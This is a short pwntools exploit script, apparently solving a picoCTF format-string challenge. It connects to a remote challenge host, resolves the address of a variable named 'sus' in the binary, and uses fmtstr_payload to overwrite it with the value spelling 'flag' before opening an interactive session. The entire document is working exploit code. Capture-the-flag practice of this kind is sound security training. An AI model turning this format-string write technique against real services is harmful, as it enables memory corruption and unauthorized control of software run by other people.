from pwn import *

context.arch = 'amd64'
p = remote('rhea.picoctf.net', 50404)

#p = process('./vuln')

elf = ELF('./vuln')

target_addr = elf.sym['sus']
print(hex(target_addr))

payload = fmtstr_payload(14, {target_addr: 0x67616c66}, write_size='short')
print(f'Payload: {payload}')
print(f'Payload length: {len(payload)}')

p.sendline(payload)
p.interactive()
